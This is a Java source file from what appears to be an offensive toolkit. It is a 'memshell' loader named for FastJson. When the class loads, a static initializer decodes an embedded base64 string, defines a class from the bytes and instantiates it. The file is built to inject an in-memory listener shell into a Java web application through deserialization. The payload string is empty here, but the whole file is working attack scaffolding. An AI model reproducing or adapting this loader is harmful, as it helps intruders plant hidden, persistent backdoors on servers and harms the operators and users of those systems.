package core.memshell;

public class FastJsonListenerMemShell extends ClassLoader{
    static {
        try {
            new FastJsonListenerMemShell();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    public static byte[] base64Decode(String bs) throws Exception {
        byte[] value = null;

        Class base64;
        try {
            base64 = Class.forName("java.util.Base64");
            Object decoder = base64.getMethod("getDecoder", (Class[])null).invoke(base64, (Object[])null);
            value = (byte[])((byte[])decoder.getClass().getMethod("decode", String.class).invoke(decoder, bs));
        } catch (Exception var6) {
            try {
                base64 = Class.forName("sun.misc.BASE64Decoder");
                Object decoder = base64.newInstance();
                value = (byte[])((byte[])decoder.getClass().getMethod("decodeBuffer", String.class).invoke(decoder, bs));
            } catch (Exception var5) {
            }
        }

        return value;
    }

    public FastJsonListenerMemShell() throws Exception {
        super(Thread.currentThread().getContextClassLoader());
        String byteString = "";
        byte[] bytes = base64Decode(byteString);
        Class clazz = (Class) super.defineClass(bytes, 0, bytes.length).newInstance();
    }

}
